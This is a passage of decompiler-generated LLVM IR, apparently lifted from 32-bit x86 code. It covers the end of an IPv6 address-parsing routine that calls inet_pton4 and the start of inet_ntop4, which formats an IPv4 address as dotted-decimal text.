  %v4_8053cc6 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8057a74.245, i32 0, i32 0), i32 %v2_8053d7d)
  store i32 %v4_8053cc6, i32* %eax.global-to-local, align 4
  %v1_8053cce = icmp eq i32 %v4_8053cc6, 0
  br i1 %v1_8053cce, label %dec_label_pc_8053ced, label %dec_label_pc_8053cd2

dec_label_pc_8053cd2:                             ; preds = %dec_label_pc_8053cbd
  %v0_8053cd2 = load i32, i32* @ebp, align 4
  %v2_8053cd2 = mul i32 %v0_8053cd2, 16
  %v1_8053cd5 = add i32 %v4_8053cc6, -134576756
  store i32 %v1_8053cd5, i32* %eax.global-to-local, align 4
  %v2_8053cda = or i32 %v2_8053cd2, %v1_8053cd5
  store i32 %v2_8053cda, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_8053cda, 65536
  br i1 %tmp, label %dec_label_pc_8053cd2.dec_label_pc_8053d76.outer_crit_edge, label %dec_label_pc_8053e16

dec_label_pc_8053cd2.dec_label_pc_8053d76.outer_crit_edge: ; preds = %dec_label_pc_8053cd2
  %v0_8053d76.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053d76.outer

dec_label_pc_8053d76.outer:                       ; preds = %dec_label_pc_8053cd2.dec_label_pc_8053d76.outer_crit_edge, %dec_label_pc_8053d36
  %v0_8053d76.pre = phi i32 [ %v0_8053d76.pre.pre, %dec_label_pc_8053cd2.dec_label_pc_8053d76.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_8053d36 ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_8053cd2.dec_label_pc_8053d76.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_8053d36 ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_8053cd2.dec_label_pc_8053d76.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_8053d36 ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_8053cd2.dec_label_pc_8053d76.outer_crit_edge ], [ 0, %dec_label_pc_8053d36 ]
  %v4_8053cf2 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_8053cf7 = icmp eq i1 %v4_8053cf2, false
  br label %dec_label_pc_8053d76

dec_label_pc_8053ced:                             ; preds = %dec_label_pc_8053cbd
  %v0_8053ced = load i32, i32* @esi, align 4
  %v9_8053ced = icmp eq i32 %v0_8053ced, 58
  %v1_8053cf0 = icmp eq i1 %v9_8053ced, false
  br i1 %v1_8053cf0, label %dec_label_pc_8053d42, label %dec_label_pc_8053cf2

dec_label_pc_8053cf2:                             ; preds = %dec_label_pc_8053ced
  br i1 %v1_8053cf7, label %dec_label_pc_8053d0e, label %dec_label_pc_8053cf9

dec_label_pc_8053cf9:                             ; preds = %dec_label_pc_8053cf2
  %v5_8053cf9 = icmp eq i8* %stack_var_-44.1, null
  %v1_8053cfe = icmp eq i1 %v5_8053cf9, false
  br i1 %v1_8053cfe, label %dec_label_pc_8053e16, label %dec_label_pc_8053d04

dec_label_pc_8053d04:                             ; preds = %dec_label_pc_8053cf9
  %v0_8053d04 = load i32, i32* @ebx, align 4
  %v5_8053d04 = inttoptr i32 %v0_8053d04 to i8*
  %v0_8053d08 = load i32, i32* @edi, align 4
  %v5_8053d08 = inttoptr i32 %v0_8053d08 to i8*
  br label %dec_label_pc_8053d76

dec_label_pc_8053d0e:                             ; preds = %dec_label_pc_8053cf2
  %v0_8053d0e = load i32, i32* @edi, align 4
  %v1_8053d0e = inttoptr i32 %v0_8053d0e to i8*
  %v2_8053d0e = load i8, i8* %v1_8053d0e, align 1
  %v3_8053d0e = icmp eq i8 %v2_8053d0e, 0
  br i1 %v3_8053d0e, label %dec_label_pc_8053e16, label %dec_label_pc_8053d17

dec_label_pc_8053d17:                             ; preds = %dec_label_pc_8053d0e
  %v0_8053d17 = load i32, i32* @ebx, align 4
  %v1_8053d17 = add i32 %v0_8053d17, 2
  store i32 %v1_8053d17, i32* @edx, align 4
  %v6_8053d1e = icmp ugt i32 %v1_8053d17, %v2_8053c96
  br i1 %v6_8053d1e, label %dec_label_pc_8053e16, label %dec_label_pc_8053d24

dec_label_pc_8053d24:                             ; preds = %dec_label_pc_8053d17
  %v0_8053d24 = load i32, i32* @ebp, align 4
  %v2_8053d26 = udiv i32 %v0_8053d24, 256
  %v4_8053d26 = trunc i32 %v2_8053d26 to i8
  %v3_8053d29 = inttoptr i32 %v0_8053d17 to i8*
  store i8 %v4_8053d26, i8* %v3_8053d29, align 1
  %v0_8053d2b = load i32, i32* @ebp, align 4
  store i32 %v0_8053d2b, i32* %eax.global-to-local, align 4
  %v1_8053d2d = trunc i32 %v0_8053d2b to i8
  %v2_8053d2d = load i32, i32* @ebx, align 4
  %v3_8053d2d = add i32 %v2_8053d2d, 1
  %v4_8053d2d = inttoptr i32 %v3_8053d2d to i8*
  store i8 %v1_8053d2d, i8* %v4_8053d2d, align 1
  %v0_8053d30 = load i32, i32* @edx, align 4
  store i32 %v0_8053d30, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053d36

dec_label_pc_8053d36:                             ; preds = %dec_label_pc_8053c85, %dec_label_pc_8053ca5, %dec_label_pc_8053d24
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_8053d24 ], [ %v1_8053ca5, %dec_label_pc_8053ca5 ], [ %v0_8053ca0, %dec_label_pc_8053c85 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_8053d24 ], [ null, %dec_label_pc_8053ca5 ], [ null, %dec_label_pc_8053c85 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8053d76.outer

dec_label_pc_8053d42:                             ; preds = %dec_label_pc_8053ced
  %v9_8053d42 = icmp eq i32 %v0_8053ced, 46
  %v1_8053d45 = icmp eq i1 %v9_8053d42, false
  br i1 %v1_8053d45, label %dec_label_pc_8053e16, label %dec_label_pc_8053d4b

dec_label_pc_8053d4b:                             ; preds = %dec_label_pc_8053d42
  %v0_8053d4b = load i32, i32* @ebx, align 4
  %v1_8053d4b = add i32 %v0_8053d4b, 4
  store i32 %v1_8053d4b, i32* @esi, align 4
  %v6_8053d52 = icmp ugt i32 %v1_8053d4b, %v2_8053c96
  br i1 %v6_8053d52, label %dec_label_pc_8053e16, label %dec_label_pc_8053d58

dec_label_pc_8053d58:                             ; preds = %dec_label_pc_8053d4b
  %v4_8053d58 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_8053d58, i32* @eax, align 4
  store i32 %v0_8053d4b, i32* @edx, align 4
  store i32 %v1_8053d4b, i32* @ebx, align 4
  %v2_8053d60 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8053d60 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_8053d60, i32 %v2_8053c96)
  store i32 %v5_8053d60, i32* %eax.global-to-local, align 4
  %tmp62 = icmp slt i32 %v5_8053d60, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_8053dad, label %dec_label_pc_8053e16

dec_label_pc_8053d76:                             ; preds = %dec_label_pc_8053d76.outer, %dec_label_pc_8053d04
  %v0_8053d76 = phi i32 [ %v0_8053d08, %dec_label_pc_8053d04 ], [ %v0_8053d76.pre, %dec_label_pc_8053d76.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8053d04, %dec_label_pc_8053d04 ], [ %stack_var_-44.1.ph, %dec_label_pc_8053d76.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8053d08, %dec_label_pc_8053d04 ], [ %stack_var_-36.1.ph, %dec_label_pc_8053d76.outer ]
  %v1_8053d76 = inttoptr i32 %v0_8053d76 to i8*
  %v2_8053d76 = load i8, i8* %v1_8053d76, align 1
  %v3_8053d76 = sext i8 %v2_8053d76 to i32
  store i32 %v3_8053d76, i32* %eax.global-to-local, align 4
  %v2_8053d7d = call i32 @__GI_tolower(i32 %v3_8053d76)
  store i32 %v2_8053d7d, i32* %eax.global-to-local, align 4
  %v1_8053d85 = icmp eq i32 %v2_8053d7d, 0
  store i32 %v2_8053d7d, i32* @esi, align 4
  %v1_8053d89 = icmp eq i1 %v1_8053d85, false
  br i1 %v1_8053d89, label %dec_label_pc_8053cbd, label %dec_label_pc_8053d8f

dec_label_pc_8053d8f:                             ; preds = %dec_label_pc_8053d76
  br i1 %v4_8053cf2, label %dec_label_pc_8053dad, label %dec_label_pc_8053d96

dec_label_pc_8053d96:                             ; preds = %dec_label_pc_8053d8f
  %v0_8053d96 = load i32, i32* @ebx, align 4
  %v1_8053d96 = add i32 %v0_8053d96, 2
  store i32 %v1_8053d96, i32* @edx, align 4
  %v6_8053d9d = icmp ugt i32 %v1_8053d96, %v2_8053c96
  br i1 %v6_8053d9d, label %dec_label_pc_8053e16, label %dec_label_pc_8053d9f

dec_label_pc_8053d9f:                             ; preds = %dec_label_pc_8053d96
  %v0_8053d9f = load i32, i32* @ebp, align 4
  %v2_8053da1 = udiv i32 %v0_8053d9f, 256
  %v4_8053da1 = trunc i32 %v2_8053da1 to i8
  %v3_8053da4 = inttoptr i32 %v0_8053d96 to i8*
  store i8 %v4_8053da1, i8* %v3_8053da4, align 1
  %v0_8053da6 = load i32, i32* @ebp, align 4
  store i32 %v0_8053da6, i32* %eax.global-to-local, align 4
  %v1_8053da8 = trunc i32 %v0_8053da6 to i8
  %v2_8053da8 = load i32, i32* @ebx, align 4
  %v3_8053da8 = add i32 %v2_8053da8, 1
  %v4_8053da8 = inttoptr i32 %v3_8053da8 to i8*
  store i8 %v1_8053da8, i8* %v4_8053da8, align 1
  %v0_8053dab = load i32, i32* @edx, align 4
  store i32 %v0_8053dab, i32* @ebx, align 4
  br label %dec_label_pc_8053dad

dec_label_pc_8053dad:                             ; preds = %dec_label_pc_8053d8f, %dec_label_pc_8053d58, %dec_label_pc_8053d9f
  %v4_8053dad = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8053dad = icmp eq i8* %stack_var_-44.1, null
  %v0_8053de5.pre = load i32, i32* @ebx, align 4
  br i1 %v5_8053dad, label %dec_label_pc_8053de5, label %dec_label_pc_8053db4

dec_label_pc_8053db4:                             ; preds = %dec_label_pc_8053dad
  store i32 1, i32* @esi, align 4
  %v6_8053dbb = sub i32 %v0_8053de5.pre, %v4_8053dad
  store i32 %v6_8053dbb, i32* @edi, align 4
  %v16_8053dbf = icmp eq i32 %v0_8053de5.pre, %v2_8053c96
  %v1_8053dc3 = icmp eq i1 %v16_8053dbf, false
  br i1 %v1_8053dc3, label %dec_label_pc_8053ddd.preheader, label %dec_label_pc_8053e16

dec_label_pc_8053ddd.preheader:                   ; preds = %dec_label_pc_8053db4
  %v3_8053ddd89 = inttoptr i32 %v6_8053dbb to i8*
  %v9_8053ddf98 = icmp slt i8* %v3_8053ddd89, inttoptr (i32 1 to i8*)
  br i1 %v9_8053ddf98, label %dec_label_pc_8053de1, label %dec_label_pc_8053dc7

dec_label_pc_8053dc7:                             ; preds = %dec_label_pc_8053ddd.preheader, %dec_label_pc_8053dc7
  %v0_8053dd5100 = phi i32 [ %v0_8053ddd.pre, %dec_label_pc_8053dc7 ], [ 1, %dec_label_pc_8053ddd.preheader ]
  %v0_8053dc799 = phi i32 [ %v1_8053ddd.pre, %dec_label_pc_8053dc7 ], [ %v6_8053dbb, %dec_label_pc_8053ddd.preheader ]
  %v2_8053dcd = sub i32 %v0_8053dc799, %v0_8053dd5100
  %v6_8053dcf = add i32 %v2_8053dcd, %v4_8053dad
  store i32 %v6_8053dcf, i32* %eax.global-to-local, align 4
  %v2_8053dd3 = sub i32 %v2_8053c96, %v0_8053dd5100
  store i32 %v2_8053dd3, i32* @ecx, align 4
  %v1_8053dd5 = add i32 %v0_8053dd5100, 1
  store i32 %v1_8053dd5, i32* @esi, align 4
  %v1_8053dd6 = inttoptr i32 %v6_8053dcf to i8*
  %v2_8053dd6 = load i8, i8* %v1_8053dd6, align 1
  %v3_8053dd6 = zext i8 %v2_8053dd6 to i32
  %v4_8053dd6 = load i32, i32* @edx, align 4
  %v5_8053dd6 = and i32 %v4_8053dd6, -256
  %v6_8053dd6 = or i32 %v5_8053dd6, %v3_8053dd6
  store i32 %v6_8053dd6, i32* @edx, align 4
  %v3_8053dd8 = inttoptr i32 %v2_8053dd3 to i8*
  store i8 %v2_8053dd6, i8* %v3_8053dd8, align 1
  %v0_8053dda = load i32, i32* %eax.global-to-local, align 4
  %v1_8053dda = inttoptr i32 %v0_8053dda to i8*
  store i8 0, i8* %v1_8053dda, align 1
  %v0_8053ddd.pre = load i32, i32* @esi, align 4
  %v1_8053ddd.pre = load i32, i32* @edi, align 4
  %v2_8053ddd = inttoptr i32 %v0_8053ddd.pre to i8*
  %v3_8053ddd = inttoptr i32 %v1_8053ddd.pre to i8*
  %v9_8053ddf = icmp sgt i8* %v2_8053ddd, %v3_8053ddd
  br i1 %v9_8053ddf, label %dec_label_pc_8053de1, label %dec_label_pc_8053dc7

dec_label_pc_8053de1:                             ; preds = %dec_label_pc_8053dc7, %dec_label_pc_8053ddd.preheader
  br label %dec_label_pc_8053de5

dec_label_pc_8053de5:                             ; preds = %dec_label_pc_8053dad, %dec_label_pc_8053de1
  %v0_8053de5 = phi i32 [ %v2_8053c96, %dec_label_pc_8053de1 ], [ %v0_8053de5.pre, %dec_label_pc_8053dad ]
  %v16_8053de5 = icmp eq i32 %v0_8053de5, %v2_8053c96
  %v1_8053de9 = icmp eq i1 %v16_8053de5, false
  br i1 %v1_8053de9, label %dec_label_pc_8053e16, label %dec_label_pc_8053deb

dec_label_pc_8053deb:                             ; preds = %dec_label_pc_8053de5
  store i32 %v2_8053c8a, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_8053df7 = call i32 @memcpy(i16* %tmp64, i32 %v2_8053c8a, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053e18

dec_label_pc_8053e06:                             ; preds = %dec_label_pc_8053c6a
  %v1_8053e06 = call i32 @__errno_location(i32 %v0_8053c59)
  %v1_8053e0b = inttoptr i32 %v1_8053e06 to i32*
  store i32 97, i32* %v1_8053e0b, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053e18

dec_label_pc_8053e16:                             ; preds = %dec_label_pc_8053d17, %dec_label_pc_8053d0e, %dec_label_pc_8053cd2, %dec_label_pc_8053cf9, %dec_label_pc_8053db4, %dec_label_pc_8053d58, %dec_label_pc_8053de5, %dec_label_pc_8053d96, %dec_label_pc_8053d4b, %dec_label_pc_8053d42, %dec_label_pc_8053ca5
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053e18

dec_label_pc_8053e18:                             ; preds = %dec_label_pc_8053e06, %dec_label_pc_8053deb, %dec_label_pc_8053c75, %dec_label_pc_8053e16
  %v0_8053e1f = phi i32 [ -1, %dec_label_pc_8053e06 ], [ 1, %dec_label_pc_8053deb ], [ %v3_8053c7b, %dec_label_pc_8053c75 ], [ 0, %dec_label_pc_8053e16 ]
  store i32 %v0_8053c59, i32* @ebx, align 4
  store i32 %v0_8053c58, i32* @esi, align 4
  store i32 %v0_8053c57, i32* @edi, align 4
  store i32 %v0_8053c56, i32* @ebp, align 4
  ret i32 %v0_8053e1f

; uselistorder directives
  uselistorder i32 %v1_8053ddd.pre, { 1, 0 }
  uselistorder i32 %v0_8053ddd.pre, { 1, 0 }
  uselistorder i32 %v0_8053dd5100, { 2, 1, 0 }
  uselistorder i32 %v0_8053de5.pre, { 1, 0, 2 }
  uselistorder i32 %v2_8053d7d, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_8053c96, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_8053c59, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8053e18, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053e16, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8053de5, { 1, 0 }
  uselistorder label %dec_label_pc_8053dc7, { 1, 0 }
  uselistorder label %dec_label_pc_8053dad, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053d76, { 1, 0 }
  uselistorder label %dec_label_pc_8053d36, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053d76.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_8053e21 = load i32, i32* @edi, align 4
  %v0_8053e22 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_8053e26 = ptrtoint i32* %stack_var_-76 to i32
  %v0_8053e29 = load i32, i32* @eax, align 4
  %v3_8053e2d = and i32 %v0_8053e29, -65536
  %v2_8053e33 = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_8053e38 = load i32, i32* @edx, align 4
  %v5_8053e38 = inttoptr i32 %v0_8053e38 to i8*
  store i8* %v5_8053e38, i8** %stack_var_-56, align 4
  %v0_8053e3c = load i32, i32* @ecx, align 4
  store i32 %v3_8053e2d, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_8053e47 = add i32 %v2_8053e33, 4
  store i32 %v6_8053e47, i32* %edi.global-to-local, align 4
  %v2_8053e48 = inttoptr i32 %v6_8053e47 to i32*
  store i32 0, i32* %v2_8053e48, align 4
  %v3_8053e48 = load i32, i32* %edi.global-to-local, align 4
  %v6_8053e48 = add i32 %v3_8053e48, 4
  store i32 %v6_8053e48, i32* %edi.global-to-local, align 4
  %v0_8053e49 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053e49 = inttoptr i32 %v6_8053e48 to i32*
  store i32 %v0_8053e49, i32* %v2_8053e49, align 4
  %v3_8053e49 = load i32, i32* %edi.global-to-local, align 4
  %v6_8053e49 = add i32 %v3_8053e49, 4
  store i32 %v6_8053e49, i32* %edi.global-to-local, align 4
  %v0_8053e4a = load i32, i32* %eax.global-to-local, align 4
  %v1_8053e4a = trunc i32 %v0_8053e4a to i16
  %v3_8053e4a = inttoptr i32 %v6_8053e49 to i16*
  store i16 %v1_8053e4a, i16* %v3_8053e4a, align 2
  %v4_8053e4a = load i32, i32* %edi.global-to-local, align 4
  %v7_8053e4a = add i32 %v4_8053e4a, 2
  %v0_8053e4c = load i32, i32* %eax.global-to-local, align 4
  %v1_8053e4c = trunc i32 %v0_8053e4c to i8
  %v3_8053e4c = inttoptr i32 %v7_8053e4a to i8*
  store i8 %v1_8053e4c, i8* %v3_8053e4c, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_8053ee730 = load i32, i32* @esi, align 4
  %v10_8053ee736 = icmp eq i32 %v0_8053ee730, 3
  store i1 %v10_8053ee736, i1* %zf.global-to-local, align 1
  %v7_8053eea38 = icmp sgt i32 %v0_8053ee730, 3
  br i1 %v7_8053eea38, label %dec_label_pc_8053ef0, label %dec_label_pc_8053e54

dec_label_pc_8053e54:                             ; preds = %dec_label_pc_8053ec7, %entry
  %v3_8053e6a = phi i32 [ 0, %entry ], [ %v1_8053ef0.pre, %dec_label_pc_8053ec7 ]
  %v0_8053ee739 = phi i32 [ %v0_8053ee730, %entry ], [ %v0_8053ee7, %dec_label_pc_8053ec7 ]
  %v2_8053e5a = add i32 %v0_8053ee739, %v0_8053e29
  %v12_8053e5a = icmp eq i32 %v2_8053e5a, 0
  store i1 %v12_8053e5a, i1* %zf.global-to-local, align 1
  store i32 %v2_8053e5a, i32* %ebp.global-to-local, align 4
  %v1_8053e5c = inttoptr i32 %v2_8053e5a to i8*
  %v2_8053e5c = load i8, i8* %v1_8053e5c, align 1
  %v3_8053e5c = zext i8 %v2_8053e5c to i32
  %v4_8053e5c = load i32, i32* @edx, align 4
  %v5_8053e5c = and i32 %v4_8053e5c, -65536
  %v6_8053e5c = or i32 %v5_8053e5c, %v3_8053e5c
  store i32 %v6_8053e5c, i32* %edx.global-to-local, align 4
  %div8 = udiv i8 %v2_8053e5c, 100
  %v6_8053e63 = zext i8 %div8 to i32
  %tmp24 = urem i8 %v2_8053e5c, 100
  %v12_8053e63 = zext i8 %tmp24 to i32
  %v14_8053e63 = mul nuw nsw i32 %v12_8053e63, 256
  %v15_8053e63 = or i32 %v6_8053e63, %v5_8053e5c
  %v16_8053e63 = or i32 %v15_8053e63, %v14_8053e63
  store i32 %v16_8053e63, i32* %eax.global-to-local, align 4
  %v2_8053e67 = or i8 %div8, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_8053e6a = load i32, i32* @esp, align 4
  %v4_8053e6a = add i32 %v2_8053e6a, 43
  %v5_8053e6a = add i32 %v4_8053e6a, %v3_8053e6a
  %v6_8053e6a = inttoptr i32 %v5_8053e6a to i8*
  store i8 %v2_8053e67, i8* %v6_8053e6a, align 1
  %v0_8053e6e = load i32, i32* %edi.global-to-local, align 4
  %v1_8053e6e = add i32 %v0_8053e6e, 1
  store i32 %v0_8053e6e, i32* @ecx, align 4
  %v0_8053e77 = load i32, i32* @esp, align 4
  %v2_8053e77 = add i32 %v0_8053e6e, 43
  %v3_8053e77 = add i32 %v2_8053e77, %v0_8053e77
  %v4_8053e77 = inttoptr i32 %v3_8053e77 to i8*
  %v5_8053e77 = load i8, i8* %v4_8053e77, align 1
  %v11_8053e77 = icmp eq i8 %v5_8053e77, 48
  store i1 %v11_8053e77, i1* %zf.global-to-local, align 1
  %v1_8053e7c = icmp eq i1 %v11_8053e77, false
  %v0_8053ea6 = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_8053e7c, label %dec_label_pc_8053ea4, label %dec_label_pc_8053e7e

dec_label_pc_8053e7e:                             ; preds = %dec_label_pc_8053e54
  %v3_8053e82 = trunc i32 %v0_8053ea6 to i16
  %v5_8053e82 = udiv i16 %v3_8053e82, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_8053e82, 256
  %tmp42 = urem i16 %tmp, 10
  %tmp25 = zext i16 %tmp42 to i32
  store i32 %tmp25, i32* %edx.global-to-local, align 4
  %v1_8053e94 = trunc i16 %tmp42 to i8
  %v2_8053e94 = or i8 %v1_8053e94, 48
  %v12_8053e94 = zext i8 %v2_8053e94 to i32
  store i32 %v12_8053e94, i32* %eax.global-to-local, align 4
  %v7_8053e96 = icmp eq i8 %v1_8053e94, 0
  store i1 %v7_8053e96, i1* %zf.global-to-local, align 1
  store i8 %v2_8053e94, i8* %v4_8053e77, align 1
  %v0_8053e9c = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8053e9c, label %dec_label_pc_8053ec7, label %dec_label_pc_8053e9e

dec_label_pc_8053e9e:                             ; preds = %dec_label_pc_8053e7e
  store i32 %v1_8053e6e, i32* @ecx, align 4
  br label %dec_label_pc_8053ec7

dec_label_pc_8053ea4:                             ; preds = %dec_label_pc_8053e54
  store i32 %v1_8053e6e, i32* %ebx.global-to-local, align 4
  %v3_8053eac = trunc i32 %v0_8053ea6 to i16
  %v5_8053eac = udiv i16 %v3_8053eac, 10
  %tmp43 = urem i16 %v5_8053eac, 256
  %tmp44 = urem i16 %tmp43, 10
  %tmp26 = zext i16 %tmp44 to i32
  store i32 %tmp26, i32* %edx.global-to-local, align 4
  %v1_8053ebc = add i32 %v0_8053e6e, 2
  store i32 %v1_8053ebc, i32* @ecx, align 4
  %v1_8053ec1 = trunc i16 %tmp44 to i8
  %v2_8053ec1 = or i8 %v1_8053ec1, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_8053ec1 = zext i8 %v2_8053ec1 to i32
  store i32 %v12_8053ec1, i32* %eax.global-to-local, align 4
  %v4_8053ec3 = add i32 %v0_8053e6e, 44
  %v5_8053ec3 = add i32 %v4_8053ec3, %v0_8053e77
  %v6_8053ec3 = inttoptr i32 %v5_8053ec3 to i8*
  store i8 %v2_8053ec1, i8* %v6_8053ec3, align 1
  br label %dec_label_pc_8053ec7

dec_label_pc_8053ec7:                             ; preds = %dec_label_pc_8053e7e, %dec_label_pc_8053e9e, %dec_label_pc_8053ea4
  %v0_8053ec7 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053ec7 = inttoptr i32 %v0_8053ec7 to i8*
  %v2_8053ec7 = load i8, i8* %v1_8053ec7, align 1
  %v3_8053ec7 = zext i8 %v2_8053ec7 to i32
  store i32 %v3_8053ec7, i32* %eax.global-to-local, align 4
  %v0_8053ed0 = load i32, i32* @esi, align 4
  %v1_8053ed0 = add i32 %v0_8053ed0, 1
  store i32 %v1_8053ed0, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8053ed5 = load i32, i32* @esp, align 4
  %v1_8053ed5 = load i32, i32* @ecx, align 4
  %v2_8053ed5 = add i32 %v0_8053ed5, 44
  %v3_8053ed5 = add i32 %v2_8053ed5, %v1_8053ed5
  %v4_8053ed5 = inttoptr i32 %v3_8053ed5 to i8*
  store i8 46, i8* %v4_8053ed5, align 1
  %v0_8053eda = load i32, i32* @ecx, align 4
  %v1_8053eda = add i32 %v0_8053eda, 2
  store i32 %v1_8053eda, i32* %edi.global-to-local, align 4
  %v0_8053edd = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053edd = load i32, i32* %eax.global-to-local, align 4
  %v2_8053edd = zext i32 %v1_8053edd to i64
  %v3_8053edd = load i32, i32* %edx.global-to-local, align 4
  %v4_8053edd = zext i32 %v3_8053edd to i64
  %v5_8053edd = mul nuw i64 %v4_8053edd, 4294967296
  %v6_8053edd = or i64 %v5_8053edd, %v2_8053edd
  %v7_8053edd = zext i32 %v0_8053edd to i64
  %v8_8053edd = udiv i64 %v6_8053edd, %v7_8053edd
  %v9_8053edd = trunc i64 %v8_8053edd to i32
  %v10_8053edd = urem i64 %v6_8053edd, %v7_8053edd
  %v11_8053edd = trunc i64 %v10_8053edd to i32
  store i32 %v11_8053edd, i32* @edx, align 4
  %v3_8053edf = and i32 %v9_8053edd, -256
  %v1_8053ee1 = trunc i64 %v10_8053edd to i8
  %v2_8053ee1 = add i8 %v1_8053ee1, 48
  %v12_8053ee1 = zext i8 %v2_8053ee1 to i32
  %v15_8053ee1 = or i32 %v12_8053ee1, %v3_8053edf
  store i32 %v15_8053ee1, i32* %eax.global-to-local, align 4
  %v2_8053ee3 = load i32, i32* @esp, align 4
  %v4_8053ee3 = add i32 %v0_8053eda, 43
  %v5_8053ee3 = add i32 %v4_8053ee3, %v2_8053ee3
  %v6_8053ee3 = inttoptr i32 %v5_8053ee3 to i8*
  store i8 %v2_8053ee1, i8* %v6_8053ee3, align 1
  %v0_8053ee7 = load i32, i32* @esi, align 4
  %v10_8053ee7 = icmp eq i32 %v0_8053ee7, 3
  store i1 %v10_8053ee7, i1* %zf.global-to-local, align 1
  %v7_8053eea = icmp sgt i32 %v0_8053ee7, 3
  %v1_8053ef0.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_8053eea, label %dec_label_pc_8053ef0, label %dec_label_pc_8053e54

dec_label_pc_8053ef0:                             ; preds = %dec_label_pc_8053ec7, %entry
  %v1_8053ef0 = phi i32 [ 0, %entry ], [ %v1_8053ef0.pre, %dec_label_pc_8053ec7 ]
  %v0_8053ef0 = load i32, i32* @esp, align 4
  %v2_8053ef0 = add i32 %v0_8053ef0, 42
  %v3_8053ef0 = add i32 %v2_8053ef0, %v1_8053ef0
  %v4_8053ef0 = inttoptr i32 %v3_8053ef0 to i8*
  store i8 0, i8* %v4_8053ef0, align 1
  %v0_8053ef5 = load i32, i32* @esp, align 4
  %v9_8053ef5 = icmp eq i32 %v0_8053ef5, 12
  store i1 %v9_8053ef5, i1* %zf.global-to-local, align 1
  %tmp27 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp27, i8** %stack_var_-92, align 4
  %v3_8053efd = call i32 @strlen(i8* %tmp27)
  store i32 %v3_8053efd, i32* @eax, align 4
  %v15_8053f05 = icmp eq i32 %v3_8053efd, %v0_8053e3c
  store i1 %v15_8053f05, i1* %zf.global-to-local, align 1
  %tmp45 = icmp ugt i32 %v3_8053efd, %v0_8053e3c
  br i1 %tmp45, label %dec_label_pc_8053f0b, label %dec_label_pc_8053f1a

dec_label_pc_8053f0b:                             ; preds = %dec_label_pc_8053ef0
  %v0_8053f0b = load i8*, i8** %stack_var_-92, align 4
  %v1_8053f0b = ptrtoint i8* %v0_8053f0b to i32
